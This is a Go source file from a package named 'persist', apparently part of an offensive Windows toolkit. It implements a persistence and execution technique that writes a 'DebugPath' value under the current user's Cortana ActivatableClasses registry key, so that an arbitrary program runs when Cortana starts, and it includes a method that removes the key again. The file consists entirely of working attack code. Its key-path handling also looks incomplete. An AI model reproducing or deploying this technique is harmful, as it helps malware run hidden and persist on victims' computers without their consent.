// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import (
	"errors"
	"io"
	"strings"

	"golang.org/x/sys/windows/registry"
)

type ExecutorCortana struct{}

func (e ExecutorCortana) findKey() (string, error) {
	nk, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Classes\\ActivatableClasses\\Package", registry.READ)
	if err != nil {
		return "<nil>", err
	}
	defer nk.Close()
	subkeys, err := nk.ReadSubKeyNames(2)
	if err != nil && err != io.EOF {
		return "<nil>", err
	}
	n := -1
	for i := range subkeys {
		if strings.Contains(subkeys[i], "Microsoft.Windows.Cortana_") {
			n = i
		}
	}
	if n < 0 {
		return "<nil>", errors.New("cannot find key which contains Microsoft.Windows.Cortana_")
	}
	key := subkeys[n]
	return key, nil
}

func (e ExecutorCortana) Exec(path string) error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	k, exists, err := registry.CreateKey(registry.CURRENT_USER, kpath, registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}
	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, kpath)
	err = k.SetStringValue("DebugPath", path)
	return err
}

func (e ExecutorCortana) Revert() error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	err = registry.DeleteKey(registry.CURRENT_USER, kpath)
	return err
}
